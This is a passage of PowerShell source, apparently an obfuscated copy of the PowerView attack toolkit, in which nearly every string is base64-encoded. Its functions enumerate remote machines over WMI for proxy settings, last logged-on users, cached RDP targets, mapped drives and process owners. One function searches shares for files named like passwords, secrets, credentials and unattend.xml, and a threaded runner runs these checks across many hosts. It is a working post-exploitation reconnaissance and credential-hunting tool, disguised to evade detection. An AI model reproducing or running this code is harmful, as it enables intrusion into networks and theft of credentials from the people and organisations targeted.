                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $WmiArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                $RegProvider = Get-WmiObject @WmiArguments
                $Key = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0ACAAUwBlAHQAdABpAG4AZwBzAA==')))
                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA==')))).sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA=')))).sValue
                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                        Write-Warning "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL"
                    }
                }
                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))) $ProxyServer
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))) $AutoConfigURL
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBwAGEAZAA='))) $Wpad
                    $Out.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwB4AHkAUwBlAHQAdABpAG4AZwBzAA=='))))
                    $Out
                }
                else {
                    Write-Warning "[Get-WMIRegProxy] No proxy settings found for $ComputerName"
                }
            }
            catch {
                Write-Warning "[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_"
            }
        }
    }
}
function Get-WMIRegLastLoggedOn {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $HKLM = 2147483650
            $WmiArguments = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = $Computer
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $WmiArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $Key = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
                $Value = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                $LastLoggedOn | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4A'))) $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAGEAcwB0AEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByAA=='))))
                $LastLoggedOn
            }
            catch {
                Write-Warning "[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled."
            }
        }
    }
}
function Get-WMIRegCachedRDPConnection {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $HKU = 2147483651
            $WmiArguments = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = $Computer
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $WmiArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }
                        $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames
                        ForEach ($Connection in $ConnectionKeys) {
                            if ($Connection -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBSAFUALgAqAA==')))) {
                                $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue
                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                                $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                                $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $UserSID
                                $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $TargetServer
                                $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                                $FoundConnection
                            }
                        }
                        $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames
                        ForEach ($Server in $ServerKeys) {
                            $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $UserSID
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $Server
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegCachedRDPConnection] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function Get-WMIRegMountedDrive {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $HKU = 2147483651
            $WmiArguments = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = $Computer
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $WmiArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }
                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames
                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))).sValue
                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA=')))).sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))).sValue
                            if (-not $UserName) { $UserName = '' }
                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
                                $MountedDrive | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                                $MountedDrive | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                                $MountedDrive | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $UserSID
                                $MountedDrive | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAEwAZQB0AHQAZQByAA=='))) $DriveLetter
                                $MountedDrive | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA'))) $ProviderName
                                $MountedDrive | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA='))) $RemotePath
                                $MountedDrive | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAFUAcwBlAHIATgBhAG0AZQA='))) $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBNAG8AdQBuAHQAZQBkAEQAcgBpAHYAZQA='))))
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegMountedDrive] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function Get-WMIProcess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'ComputerName' = $ComputerName
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAF8AcAByAG8AYwBlAHMAcwA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $WmiArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Owner.Domain
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAFAAcgBvAGMAZQBzAHMA'))))
                    $Process
                }
            }
            catch {
                Write-Verbose "[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: $_"
            }
        }
    }
}
function Find-InterestingFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeFolders,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeHidden,
        [Switch]
        $CheckWriteAccess,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments =  @{
            'Recurse' = $True
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            'Include' = $Include
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))]) {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))]) {
            $LastAccessTime = (Get-Date).AddDays(-7).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA=='))))
        }
        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAYwBlAA==')))] = -not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBIAGkAZABkAGUAbgA=')))]
        $MappedComputers = @{}
        function Test-Write {
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $Continue = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBGAG8AbABkAGUAcgBzAA==')))] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AdQBuAGQARgBpAGwAZQA='))))
                    $FoundFile
                }
            }
        }
    }
    END {
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}
function New-ThreadedFunction {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,
        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,
        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,
        [Switch]
        $NoImports
    )
    BEGIN {
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not $NoImports) {
            $MyVars = Get-Variable -Scope 2
            $VorbiddenVars = @('?',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB